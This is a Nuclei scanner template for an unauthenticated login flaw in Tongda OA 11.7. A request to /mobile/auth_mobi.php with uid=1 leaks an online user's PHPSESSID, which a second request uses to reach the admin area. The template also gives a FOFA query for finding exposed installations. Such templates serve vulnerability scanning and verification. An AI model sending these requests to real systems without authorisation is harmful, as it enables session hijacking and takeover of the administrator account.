id: tongda-oa-auth_mobi-unauth

info:
  name: 通达 OA 11.7 auth_mobi.php - unauth
  author: HuTa0
  severity: high
  description: Tongda OA is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., LTD v11.7 has the interface query online user function, when the user is online, it will return PHPSESSION so that it can log in to the background system.
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA%20v11.7%20auth_mobi.php%20%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: app="TDXK-通达OA" || icon_hash="-759108386"
  tags: tongda,unauth,oa

http:
  - raw:
      - |
        GET /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0 HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /general/ HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "len(body_1) == 0"
          - '!contains(body_1, "RELOGIN")'
          - "contains(header_1,'PHPSESSID=')"
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains(body_2,'user_id:') && contains(body_2,'user_name:') && contains(body_2,'var loginUser')"
        condition: and
